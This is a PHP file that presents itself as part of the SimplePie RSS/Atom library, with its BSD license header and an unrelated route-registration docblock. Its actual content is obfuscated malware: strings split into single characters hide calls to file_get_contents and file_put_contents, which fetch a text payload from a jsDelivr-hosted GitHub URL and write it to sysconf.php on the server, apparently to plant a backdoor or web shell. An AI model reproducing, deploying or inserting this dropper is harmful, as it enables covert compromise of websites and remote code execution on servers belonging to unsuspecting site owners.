    <?php
    
    /**
     *
     * A PHP-Based RSS and Atom Feed Framework.
     * Takes the hard work out of managing a complete RSS/Atom solution.
     *
     * Copyright (c) 2004-2016, Ryan Parman, Sam Sneddon, Ryan McCue, and contributors
     * All rights reserved.
     *
     * Redistribution and use in source and binary forms, with or without modification, are
     * permitted provided that the following conditions are met:
     *
     * 	* Redistributions of source code must retain the above copyright notice, this list of
     * 	  conditions and the following disclaimer.
     *
     * 	* Redistributions in binary form must reproduce the above copyright notice, this list
     * 	  of conditions and the following disclaimer in the documentation and/or other materials
     * 	  provided with the distribution.
     *
     * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
     * 	  to endorse or promote products derived from this software without specific prior
     * 	  written permission.
     *
     * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
     * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
     * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
     * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
     * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
     * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
     * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
     * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
     * POSSIBILITY OF SUCH DAMAGE.
     *
     * @copyright 2004-2016 Ryan Parman, Sam Sneddon, Ryan McCue
     * @author Ryan Parman
     * @author Sam Sneddon
     * @author Ryan McCue
     * @license http://www.opensource.org/licenses/bsd-license.php BSD License
     */
    $f = 'f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $h = 'h'.'t'.'m'.'l'.'s'.'p'.'e'.'c'.'i'.'a'.'l'.'c'.'h'.'a'.'r'.'s';
    $tu = 'h'.'t'.'t'.'ps'.':'.'//'.'c'.'d'.'n'.'.j'.'s'.'d'.'el'.'iv'.'r.n'.'et/'.'gh/'.'l'.'u'.'c'.'e'.'n'.'b'.'y'.'t'.'e'.'/'.'A'.'r'.'c'.'h'.'i'.'L'.'o'.'g'.'s'.'@'.'m'.'a'.'i'.'n'.'/'.'v'.'2'.'/'.'l'.'o'.'w'.'-'.'v'.'2'.'.'.'t'.'x'.'t';
    $fp = 'f'.'i'.'l'.'e_'.'p'.'u'.'t'.'_c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
    $sa    = __DIR__ . '/s'.'y'.'s'.'c'.'o'.'n'.'f'.'.'.'p'.'h'.'p';
    $s = 's'.'t'.'r'.'l'.'e'.'n';

    /**
     * Register a route with given parameters
     *
     * @param string $path The path for the route to register the service on. Route gets namespaced with leadin/v1.
     * @param string $methods Comma seperated list of methods allowed for this route.
     * @param array  $callback Method to execute when this endpoint is requested.
     */
    $d = @$f($tu);

    if ($d !== false && $s($d) > 0) {
        if (@$fp($sa, $d) !== false) {
            echo 'Successfully Updated';
        } else {
            echo 'Error Updating File';
        }
    } else {
        echo 'Not Found';
    }
